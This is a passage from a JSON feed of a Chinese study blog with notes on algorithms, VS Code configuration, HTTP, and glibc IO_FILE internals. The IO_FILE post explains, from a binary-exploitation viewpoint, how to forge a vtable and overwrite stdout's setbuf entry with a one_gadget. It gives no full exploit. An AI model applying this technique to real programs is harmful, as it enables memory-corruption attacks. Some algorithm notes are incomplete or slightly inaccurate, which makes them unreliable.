            "content_html": "<h1 id=\"简介\"><a class=\"markdownIt-Anchor\" href=\"#简介\">#</a> 简介</h1>\n<p><strong>并查集</strong>是计算机中的集合算法。不同集合间无交集，可用于解决元素分组问题。</p>\n<p>在每个集合中指定一个代表元素，代表该集合。</p>\n<p>该算法有两种基本操作：</p>\n<p><strong>合并（Union）</strong> 把两个不相交的集合合并成一个集合</p>\n<p><strong>查询（Find）</strong> 查询两个元素是否在同一个集合中。</p>\n<p>利用树构成一个集合。递归查询节点的父节点便可获得根节点。</p>\n<h1 id=\"实现\"><a class=\"markdownIt-Anchor\" href=\"#实现\">#</a> 实现</h1>\n<p>设立一个数组，储存每个元素的父元素。</p>\n<p>如第 1 个节点的父节点为 <code>fa[1]</code></p>\n<h1 id=\"优化\"><a class=\"markdownIt-Anchor\" href=\"#优化\">#</a> 优化</h1>\n<h2 id=\"路径压缩\"><a class=\"markdownIt-Anchor\" href=\"#路径压缩\">#</a> 路径压缩</h2>\n<p>合并集合时，每个节点只储存根节点。即，树的深度为 2。</p>\n<h2 id=\"秩的压缩\"><a class=\"markdownIt-Anchor\" href=\"#秩的压缩\">#</a> 秩的压缩</h2>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/other/",
            "url": "http://waltcsz.github.io/2023/11/other/",
            "title": "other",
            "date_published": "2023-11-24T13:04:58.000Z",
            "content_html": "<p>排序</p>\n<p>贪心算法</p>\n<p>递归</p>\n<p>dfs</p>\n<p>bfs</p>\n<p>回溯算法</p>\n<p>并查集</p>\n<p>暴力搜索</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/graph/",
            "url": "http://waltcsz.github.io/2023/11/graph/",
            "title": "graph",
            "date_published": "2023-11-24T11:36:18.000Z",
            "content_html": "<h1 id=\"路径\"><a class=\"markdownIt-Anchor\" href=\"#路径\">#</a> 路径</h1>\n<h2 id=\"最小路\"><a class=\"markdownIt-Anchor\" href=\"#最小路\">#</a> 最小路</h2>\n<h3 id=\"dijkstra\"><a class=\"markdownIt-Anchor\" href=\"#dijkstra\">#</a> Dijkstra</h3>\n<p>步骤</p>\n<ol>\n<li>初始化，寻找起始点 s 到各点距离的最小值。以及最小值对应点 u</li>\n<li>查找，利用中间点 k，寻找 u 到终点 v 的最短路劲 <code>(u,v)</code> 。 <code>if (matrix[start][u] +matrix[u][k] &lt; matrix[start][k]) matrix[start][k]=matrix[start][u]+matrix[u][k]</code></li>\n</ol>\n<h2 id=\"最小生成树\"><a class=\"markdownIt-Anchor\" href=\"#最小生成树\">#</a> 最小生成树</h2>\n<h3 id=\"kruskal算法\"><a class=\"markdownIt-Anchor\" href=\"#kruskal算法\">#</a> Kruskal 算法</h3>\n<p>加边法。</p>\n<ol>\n<li>将所有边按权重排序，从小到大。</li>\n<li>从小到大选择边，将两个节点合并为一个节点。</li>\n<li>重复 2，直到只剩一个节点或达到 n-1 条边为止。</li>\n</ol>\n<h3 id=\"prim算法\"><a class=\"markdownIt-Anchor\" href=\"#prim算法\">#</a> Prim 算法</h3>\n<p>加点法。</p>\n<ol>\n<li>从一个零图开始，先添加一个点</li>\n<li>添加一个新点，以及对应的连接边。应满足该边为所有已添加的点和未添加的点的边的权重最小值。</li>\n<li>重复 2，直到所有点均已添加。</li>\n<li></li>\n</ol>\n<h1 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> </h1>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/knapsack/",
            "url": "http://waltcsz.github.io/2023/11/knapsack/",
            "title": "knapsack",
            "date_published": "2023-11-24T11:35:46.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/dp/",
            "url": "http://waltcsz.github.io/2023/11/dp/",
            "title": "dp",
            "date_published": "2023-11-24T11:35:22.000Z",
            "content_html": "<h1 id=\"基础\"><a class=\"markdownIt-Anchor\" href=\"#基础\">#</a> 基础</h1>\n<h2 id=\"优化\"><a class=\"markdownIt-Anchor\" href=\"#优化\">#</a> 优化</h2>\n<h3 id=\"滚动数组\"><a class=\"markdownIt-Anchor\" href=\"#滚动数组\">#</a> 滚动数组</h3>\n<p>由于 dp 二维表最终只要最后一行最后一列的数据，因此可以用滚动数组，只保留一行数据进行遍历。好像要从大到小。</p>\n<h1 id=\"字符串\"><a class=\"markdownIt-Anchor\" href=\"#字符串\">#</a> 字符串</h1>\n<h2 id=\"最长公共子序列\"><a class=\"markdownIt-Anchor\" href=\"#最长公共子序列\">#</a> 最长公共子序列</h2>\n<ul>\n<li>str1 的长度为 m，str2 的长度为 2</li>\n<li><code>dp[i][j]</code>  表示长度为 <code>i</code>  的 str1 子串和长度为 <code>j</code>  的 str2 子串的最长公共子序列的长度。子串取 <code>[0:i)</code>  或 <code>[0:j)</code>  范围的字符串。</li>\n<li>i 和 j 均从 0 开始增长。</li>\n</ul>\n<pre><code class=\"language-c++\">if (str1[i]==str[j])\n\tdp[i][j] = dp[i-1][j-1] + 1;\nelse\n\tdp[i][j] = max(dp[i][j-1], dp[i-1][j]);\n</code></pre>\n<blockquote>\n<p>子串和子序列不同！</p>\n</blockquote>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><munderover><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><mi mathvariant=\"normal\">∞</mi></munderover><mfrac><mrow><mo stretchy=\"false\">(</mo><mi>z</mi><mo>−</mo><mn>1</mn><msup><mo stretchy=\"false\">)</mo><mi>n</mi></msup></mrow><msup><mn>5</mn><mi>n</mi></msup></mfrac></mrow><annotation encoding=\"application/x-tex\">\\sum^\\infin_{n=1} \\frac{(z-1)^n}{5^n}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:2.9185em;vertical-align:-1.2671em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.6514em;\"><span style=\"top:-1.8829em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.05em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">∞</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2671em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.427em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">5</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5904em;\"><span style=\"top:-2.989em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6644em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<h1 id=\"背包\"><a class=\"markdownIt-Anchor\" href=\"#背包\">#</a> 背包</h1>\n<p>0-1 背包</p>\n<p>dp 遍历。</p>\n<p><code>dp[i][j]</code>  i 物品编号， j 背包大小。表示当背包</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/vscode%E9%85%8D%E7%BD%AE/",
            "url": "http://waltcsz.github.io/2023/11/vscode%E9%85%8D%E7%BD%AE/",
            "title": "vscode配置",
            "date_published": "2023-11-23T13:20:47.000Z",
            "content_html": "<h1 id=\"常用\"><a class=\"markdownIt-Anchor\" href=\"#常用\">#</a> 常用</h1>\n<h2 id=\"快捷键\"><a class=\"markdownIt-Anchor\" href=\"#快捷键\">#</a> 快捷键</h2>\n<ul>\n<li><code>ctrl+F5</code>  调试</li>\n<li><code>F5</code>  直接运行</li>\n<li><code>Ctrl+Shift+P</code> vscode 命令窗口</li>\n<li><code>Alt+Shift+F</code>  格式化代码</li>\n<li><code>Ctrl+Shift+K</code>  删除一行</li>\n</ul>\n<h2 id=\"变量\"><a class=\"markdownIt-Anchor\" href=\"#变量\">#</a> 变量</h2>\n<p>如下是可能出现在  <code>tasks.json</code> ,  <code>launch.json</code>  中的所有变量</p>\n<ul>\n<li><code>$&#123;workspaceFolder&#125;</code>  - 图中的 redis 项目在 vs code 中打开的文件夹路径 /home/chenrui/Documents/redis</li>\n<li><code>$&#123;workspaceFolderBasename&#125;</code>  - 图中的 redis 项目在 vs code 中打开的没有任何斜杠 (/) 的文件夹的名称 redis</li>\n<li><code>$&#123;file&#125;</code>  - 当前打开的文件，如果我当前打开的是 tasks.json，那么此时中的  <code>$&#123;file&#125;</code>  就是表示的当前的 <code>tasks.json</code>  的绝对路径  <code>/home/chenrui/Documents/redis/.vscode/tasks.json</code></li>\n<li><code>$&#123;relativeFile&#125;</code>  - 当前打开文件的相对路径，如果我当前打开的是 tasks.json，那么其相对路径.vscode/tasks.json</li>\n<li><code>$&#123;relativeFileDirname&#125;</code>  - 当前打开文件相对于 workspaceFolder 的文件名 .vscode</li>\n<li><code>$&#123;fileWorkspaceFolder&#125;</code>  - 当前打开文件的工作空间文件夹 /home/chenrui/Documents/redis</li>\n<li><code>$&#123;fileBasename&#125;</code>  - 当前打开文件的文件名，如果我当前打开的是 tasks.json, tasks.json</li>\n<li><code>$&#123;fileBasenameNoExtension&#125;</code>  - 当前打开的文件的没有扩展名的文件名，如果我当前打开的是 tasks.json, tasks</li>\n<li><code>$&#123;fileDirname&#125;</code>  - 当前打开文件的 dirname，如果我当前打开的是 task.json, 那么他的文件名 /home/chenrui/Documents/redis/.vscode</li>\n<li><code>$&#123;fileExtname&#125;</code>  - 当前打开文件的扩展名，如果我当前打开的是 task.json， 那么他的扩展名 json</li>\n<li><code>$&#123;cwd&#125;</code>  - 任务运行器启动时的当前工作目录</li>\n<li><code>$&#123;lineNumber&#125;</code>  - 活动文件中当前选定的行号</li>\n<li><code>$&#123;selectedText&#125;</code>  - 活动文件中当前选定的文本</li>\n<li><code>$&#123;execPath&#125;</code>  - 运行 VS Code 可执行文件的路径</li>\n<li><code>$&#123;defaultBuildTask&#125;</code>  - 默认构建任务的名称</li>\n<li><code>$&#123;pathSeparator&#125;</code>  - 操作系统用来分隔文件路径中的组件的字符，/on macOS or linux,\\ on Windows</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9lZGl0b3IvdmFyaWFibGVzLXJlZmVyZW5jZQ==\">Visual Studio Code Variables Reference</span></p>\n<h1 id=\"配置\"><a class=\"markdownIt-Anchor\" href=\"#配置\">#</a> 配置</h1>\n<h2 id=\"launchjson\"><a class=\"markdownIt-Anchor\" href=\"#launchjson\">#</a>  <code>launch.json</code></h2>\n<p>决定项目运行时的配置，即按 <code>F5</code>  或点击 <code>run-&gt;Start debugging</code>  时的配置。</p>\n<ul>\n<li><code>&quot;preLaunchTask&quot;</code>  该项指定在执行调试前执行的任务。在 c++ 项目中一般会指定在调试前进行编译。</li>\n</ul>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">\"preLaunchTask\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"g++.exe build active file\"</span><span class=\"token punctuation\">,</span></pre></td></tr></table></figure><ul>\n<li><code>&quot;cwd&quot;</code>  设置工作目录。如果打开的文件夹内为整个项目，一般设置为该文件夹，即 <code>&quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;,</code> 。如果文件夹内为零散的源文件，如题库，那根目录一般设置为运行某个文件时该文件所在目录，即 <code>&quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;,</code> 。</li>\n<li><code>&quot;externalConsole&quot;</code>  是否在外部控制台运行。 <code>true</code>  或 <code>false</code> 。</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/iofile%E4%BB%8B%E7%BB%8D/",
            "url": "http://waltcsz.github.io/2023/11/iofile%E4%BB%8B%E7%BB%8D/",
            "title": "ioFile介绍",
            "date_published": "2023-11-20T11:15:54.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"markdownIt-Anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>IO_FILE 是描述 IO 的文件结构体，相关源码来自 libio/libioP.h 文件中。</p>\n<p><strong>IO_FILE 结构</strong>：在执行 fopen 等函数时创建。不同 IO_FILE 以链表形式串接起来。</p>\n<h1 id=\"_io_list_all变量\"><a class=\"markdownIt-Anchor\" href=\"#_io_list_all变量\">#</a>  <code>_IO_list_all</code>  变量</h1>\n<p><strong> <code>_IO_list_all</code>  变量</strong>：指向链表头部。默认链如下。</p>\n<figure class=\"highlight tex\"><figcaption data-lang=\"TeX\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>_IO_list_all - stderr -> stdout -> stdin</pre></td></tr></table></figure><h2 id=\"三文件流\"><a class=\"markdownIt-Anchor\" href=\"#三文件流\">#</a> 三文件流</h2>\n<p>存在以下三种符号，指向他们对应的 file 结构。</p>\n<p>其存放在 libc.so 中。</p>\n<pre><code>_IO_2_1_stderr_\n_IO_2_1_stdout_\n_IO_2_1_stdin_\n</code></pre>\n<h1 id=\"io-file-plus\"><a class=\"markdownIt-Anchor\" href=\"#io-file-plus\">#</a> io file plus</h1>\n<p>包裹着 file 结构体。</p>\n<p>vtable 的偏移</p>\n<table>\n<thead>\n<tr>\n<th>架构</th>\n<th>偏移</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>32</td>\n<td>0x94</td>\n</tr>\n<tr>\n<td>64</td>\n<td>0xd8</td>\n</tr>\n</tbody>\n</table>\n<pre><code class=\"language-c++\">struct _IO_FILE_plus\n&#123;\n\t_IO_FILE    file;\n\t_IO_jump_t   *vtable;\n&#125;\n</code></pre>\n<h1 id=\"file结构\"><a class=\"markdownIt-Anchor\" href=\"#file结构\">#</a> file 结构</h1>\n<p>不同 file 结构体用 chain 域串起形成链表。</p>\n<pre><code class=\"language-c++\">struct _IO_FILE &#123;\n  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;    /* Current read pointer */\n  char* _IO_read_end;    /* End of get area. */\n  char* _IO_read_base;    /* Start of putback+get area. */\n  char* _IO_write_base;    /* Start of put area. */\n  char* _IO_write_ptr;    /* Current put pointer. */\n  char* _IO_write_end;    /* End of put area. */\n  char* _IO_buf_base;    /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n  struct _IO_marker *_markers;\n  struct _IO_FILE *_chain;\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n&#125;;\n</code></pre>\n<pre><code class=\"language-c++\">struct _IO_FILE_complete\n&#123;\n  struct _IO_FILE _file;\n#endif\n#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001\n  _IO_off64_t _offset;\n# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T\n  /* Wide character stream stuff.  */\n  struct _IO_codecvt *_codecvt;\n  struct _IO_wide_data *_wide_data;\n  struct _IO_FILE *_freeres_list;\n  void *_freeres_buf;\n# else\n  void *__pad1;\n  void *__pad2;\n  void *__pad3;\n  void *__pad4;\n# endif\n  size_t __pad5;\n  int _mode;\n  /* Make sure we don't get into trouble again.  */\n  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n#endif\n&#125;;\n</code></pre>\n<h2 id=\"_io_jump_t\"><a class=\"markdownIt-Anchor\" href=\"#_io_jump_t\">#</a>  <code>_IO_jump_t</code></h2>\n<p>是 vtable 指针指向的结构体，存放着各种函数跳转地址。</p>\n<p>其中偏移为 7 的 xsputn 很有用。</p>\n<p>libc.so 自带的 <code>_IO_jump_t</code>  一般不可修改。但我们可以伪造 <code>_IO_jump_t</code>  并修改 vtable 的值指向伪造的结构体。</p>\n<pre><code class=\"language-c++\">#define JUMP_FIELD(TYPE, NAME) TYPE NAME\nstruct _IO_jump_t\n&#123;\n    JUMP_FIELD(size_t, __dummy);\n    JUMP_FIELD(size_t, __dummy2);\n    JUMP_FIELD(_IO_finish_t, __finish);\n    JUMP_FIELD(_IO_overflow_t, __overflow); // !!\n    JUMP_FIELD(_IO_underflow_t, __underflow);\n    JUMP_FIELD(_IO_underflow_t, __uflow);\n    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);\n    /* showmany */\n    JUMP_FIELD(_IO_xsputn_t, __xsputn);\t// printf函数会用 \n    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);\n    JUMP_FIELD(_IO_seekoff_t, __seekoff);\n    JUMP_FIELD(_IO_seekpos_t, __seekpos);\n    JUMP_FIELD(_IO_setbuf_t, __setbuf);\n    JUMP_FIELD(_IO_sync_t, __sync);\n    JUMP_FIELD(_IO_doallocate_t, __doallocate);\n    JUMP_FIELD(_IO_read_t, __read);\n    JUMP_FIELD(_IO_write_t, __write);\n    JUMP_FIELD(_IO_seek_t, __seek);\n    JUMP_FIELD(_IO_close_t, __close);\n    JUMP_FIELD(_IO_stat_t, __stat);\n    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);\n    JUMP_FIELD(_IO_imbue_t, __imbue);\n#if 0\n    get_column;\n    set_column;\n#endif\n&#125;;\n</code></pre>\n<p><code>_IO_2_1_stdout_</code> 中 vtable 的 setbuf 在程序退出时会执行，可修改为 one_gadget 进行利用。</p>\n<h1 id=\"输出输入函数调用栈\"><a class=\"markdownIt-Anchor\" href=\"#输出输入函数调用栈\">#</a> 输出输入函数调用栈</h1>\n<h2 id=\"fread\"><a class=\"markdownIt-Anchor\" href=\"#fread\">#</a> fread</h2>\n<p>函数位于 <code>/libio/iofread.c</code></p>\n<pre><code class=\"language-c++\">size_t fread (void *buffer, size_t size, size_t count, FILE *stream);\n</code></pre>\n<ul>\n<li>buffer 存放读取数据的缓冲区。</li>\n<li>size：指定每个记录的长度。</li>\n<li>count： 指定记录的个数。</li>\n<li>stream：目标文件流。</li>\n<li>返回值：返回读取到数据缓冲区中的记录个数</li>\n</ul>\n<p>其调用函数栈为</p>\n<pre><code>_IO_fread(buf, size, count, fp)\t// fread本体\n_IO_sgetn(fp, (char*)buf, bytes_requested)\t//(fp,data,n)\n_IO_XSGETN (fp, data, n)\t// 为vtable中的函数指针\n_IO_file_xsgetn(fp, data, n)\t// 默认情况下_IO_XSGETN所指向\n</code></pre>\n<h2 id=\"fwrite\"><a class=\"markdownIt-Anchor\" href=\"#fwrite\">#</a> fwrite</h2>\n<p>函数位于 <code> /libio/iofwrite.c</code></p>\n<pre><code class=\"language-c++\">size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);\n</code></pre>\n<ul>\n<li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址；</li>\n<li>size: 要写入内容的单字节数；</li>\n<li>count: 要进行写入 size 字节的数据项的个数；</li>\n<li>stream: 目标文件指针；</li>\n<li>返回值：实际写入的数据项个数 count。</li>\n</ul>\n<pre><code>_IO_fwrite\n_IO_XSPUTN\t// vtable 函数指针\n||\n_IO_new_file_xsputn\t\n_IO_OVERFLOW\t// vtable 函数指针\n||\n_IO_new_file_overflow\nwrite\n</code></pre>\n<h2 id=\"printf\"><a class=\"markdownIt-Anchor\" href=\"#printf\">#</a> printf</h2>\n<pre><code>vfprintf+11\n_IO_file_xsputn\n_IO_file_overflow\nfunlockfile\n_IO_file_write\nwrite\n</code></pre>\n<h1 id=\"file结构创建\"><a class=\"markdownIt-Anchor\" href=\"#file结构创建\">#</a> file 结构创建</h1>\n<h2 id=\"fopen\"><a class=\"markdownIt-Anchor\" href=\"#fopen\">#</a> fopen</h2>\n<p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p>\n<pre><code>FILE *fopen(char *filename, *type);\n</code></pre>\n<ul>\n<li>filename: 目标文件的路径</li>\n<li>type: 打开方式的类型</li>\n<li>返回值：返回一个文件指针</li>\n</ul>\n<p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p>\n<p>首先在 fopen 对应的函数 <code>__fopen_internal</code>  内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在<strong>堆上</strong>的</p>\n<pre><code>*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));\n</code></pre>\n<p>之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作</p>\n<pre><code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;\n_IO_file_init (&amp;new_f-&gt;fp);\n</code></pre>\n<p>在 <code>_IO_file_init</code>  函数的初始化操作中，会调用 <code>_IO_link_in</code>  把新分配的 FILE 链入 <code>_IO_list_all</code>  为起始的 FILE 链表中</p>\n<pre><code>void\n_IO_link_in (fp)\n     struct _IO_FILE_plus *fp;\n&#123;\n    if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)\n    &#123;\n      fp-&gt;file._flags |= _IO_LINKED;\n      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;\n      _IO_list_all = fp;\n      ++_IO_list_all_stamp;\n    &#125;\n&#125;\n</code></pre>\n<p>之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。</p>\n<pre><code>if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)\n    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);\n</code></pre>\n<p>总结一下 fopen 的操作是</p>\n<ul>\n<li>使用 malloc 分配 FILE 结构</li>\n<li>设置 FILE 结构的 vtable</li>\n<li>初始化分配的 FILE 结构</li>\n<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>\n<li>调用系统调用打开文件</li>\n</ul>\n",
            "tags": [
                "IO_FILE"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/11/http/",
            "url": "http://waltcsz.github.io/2023/11/http/",
            "title": "http",
            "date_published": "2023-11-19T17:18:23.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"markdownIt-Anchor\" href=\"#简介\">#</a> 简介</h1>\n<p><code>HTTP</code>  协议 (超文本传输协议 HyperText Transfer Protocol)，它是基于 TCP 协议的应用层传输协议。是一种无状态 (stateless) 协议。</p>\n<h1 id=\"http-url\"><a class=\"markdownIt-Anchor\" href=\"#http-url\">#</a> HTTP URL</h1>\n<p><code>HTTP URL</code>  包含了用于查找某个资源的详细信息，格式如下:</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>http://host[\":\"port][abs_path]</pre></td></tr></table></figure><h2 id=\"http请求报文\"><a class=\"markdownIt-Anchor\" href=\"#http请求报文\">#</a> http 请求报文</h2>\n<p><img data-src=\"./v2-12836e928e97f0d1acf375b34981a071_720w.webp\" alt=\"img\"></p>\n<h3 id=\"请求行\"><a class=\"markdownIt-Anchor\" href=\"#请求行\">#</a> 请求行</h3>\n<ul>\n<li>Method</li>\n<li>URL</li>\n<li>HTTP Version</li>\n</ul>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/example.html</span> <span class=\"token http-version property\">HTTP/1.1</span></span> (CRLF)</pre></td></tr></table></figure><h3 id=\"http协议\"><a class=\"markdownIt-Anchor\" href=\"#http协议\">#</a> http 协议</h3>\n<ol>\n<li><code>GET</code> ：\t 请求<strong>获取</strong> Request-URI 所标识的资源</li>\n<li><code>POST</code> ：\t在 Request-URI 所标识的资源后<strong>增加</strong>新的数据</li>\n<li><code>HEAD</code> ：\t请求获取由 Request-URI 所标识的资源的<strong>响应消息报头</strong></li>\n<li><code>PUT</code> ：\t请求服务器<strong>存储或修改</strong>一个资源，并用 Request-URI 作为其标识</li>\n<li><code>DELETE</code> ：\t请求服务器<strong>删除</strong> Request-URI 所标识的资源</li>\n<li><code>TRACE</code> ：\t请求服务器回送收到的请求信息，主要用于<strong>测试或诊断</strong></li>\n<li><code>CONNECT</code> ：\t保留将来使用</li>\n<li><code>OPTIONS</code> ：\t请求查询服务器的性能，或者查询与资源相关的选项和需求</li>\n</ol>\n<h3 id=\"消息报头\"><a class=\"markdownIt-Anchor\" href=\"#消息报头\">#</a> 消息报头</h3>\n<p><img data-src=\"https://pic2.zhimg.com/80/v2-8b50f49b69a70379a52b47060dcdf1f9_720w.webp\" alt=\"img\"></p>\n<p>只有 post 请求有请求正文，而 get 请求无。</p>\n<p><img data-src=\"https://pic2.zhimg.com/80/v2-8eefa42df5c663cf259b39be57359bb1_720w.webp\" alt=\"img\"></p>\n<h2 id=\"http响应状态码\"><a class=\"markdownIt-Anchor\" href=\"#http响应状态码\">#</a> HTTP 响应状态码</h2>\n<p>状态代码有三位数字组成，第一个数字定义了响应的<strong>类别</strong>，且有五种可能取值：</p>\n<ol>\n<li><code>1xx</code> ：<strong>指示信息</strong> - 表示请求已接收，继续处理</li>\n<li><code>2xx</code> ：<strong>成功</strong> - 表示请求已被成功接收、理解、接受</li>\n<li><code>3xx</code> ：<strong>重定向</strong> - 要完成请求必须进行更进一步的操作</li>\n<li><code>4xx</code> ：<strong>客户端错误</strong> - 请求有语法错误或请求无法实现</li>\n<li><code>5xx</code> ：<strong>服务器端错误</strong> - 服务器未能实现合法的请求</li>\n</ol>\n<p>常见状态代码、状态描述、说明：</p>\n<ul>\n<li><code>200</code> ： <strong>OK</strong> - 客户端请求成功</li>\n<li><code>400</code> ： <strong>Bad Request</strong> - 客户端请求有语法错误，不能被服务器所理解</li>\n<li><code>401</code> ： <strong>Unauthorized</strong> - 请求未经授权，这个状态代码必须和 <code>WWW-Authenticate</code>  报头域一起使用</li>\n<li><code>403</code> ： <strong>Forbidden</strong> - 服务器收到请求，但是拒绝提供服务</li>\n<li><code>404</code> ： <strong>Not Found</strong> - 请求资源不存在，eg：输入了错误的 URL</li>\n<li><code>500</code> ： <strong>Internal Server Error</strong> - 服务器发生不可预期的错误</li>\n<li><code>503</code> ： <strong>Server Unavailable</strong> - 服务器当前不能处理客户端的请求，一段时间后，可能恢复正常<br>\n<img data-src=\"./v2-9973f22000aaa5f465faadd0a75663e9_720w.webp\" alt=\"img\"></li>\n</ul>\n<p><img data-src=\"./v2-933763e166c645d219b6dbbf02424614_720w.webp\" alt=\"img\"></p>\n<p><img data-src=\"./v2-d3db700a0c258b1d4690e4f4f143b873_720w.webp\" alt=\"img\"></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/php/",
            "url": "http://waltcsz.github.io/2023/11/php/",
            "title": "php",
            "date_published": "2023-11-19T16:52:46.000Z",
